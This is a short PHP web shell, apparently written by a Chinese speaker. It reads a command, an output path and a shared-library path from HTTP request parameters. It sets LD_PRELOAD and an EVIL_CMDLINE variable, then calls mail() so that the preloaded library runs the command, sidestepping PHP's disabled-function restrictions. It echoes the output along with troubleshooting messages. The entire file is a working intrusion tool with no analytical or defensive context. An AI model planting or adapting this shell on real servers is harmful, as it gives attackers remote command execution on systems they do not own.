<?php
$cmd = $_REQUEST["cmd"];
$out_path = $_REQUEST["outpath"];
$evil_cmdline = $cmd . " > " . $out_path . " 2>&1";

echo "<br /><b>原始命令:</b> " . $cmd;
echo "<br /><b>输出路径:</b> " . $out_path;
echo "<br /><b>完整命令:</b> " . $evil_cmdline;

putenv("EVIL_CMDLINE=" . $evil_cmdline);
$so_path = $_REQUEST["sopath"];
putenv("LD_PRELOAD=" . $so_path);

echo "<br /><b>环境变量设置:</b> LD_PRELOAD=" . $so_path;

// 执行前检查
if (!file_exists($so_path)) {
    echo "<br /><b>错误:</b> 共享库不存在: " . $so_path;
}

mail("","","","");

// 检查输出文件
if (file_exists($out_path)) {
    echo "<br /><b>输出内容:</b><br />" . nl2br(file_get_contents($out_path));
} else {
    echo "<br /><b>错误:</b> 输出文件不存在，命令可能执行失败";
    // 检查目录权限
    $dir = dirname($out_path);
    if (!is_writable($dir)) {
        echo "<br /><b>目录不可写:</b> " . $dir;
    }
}
?>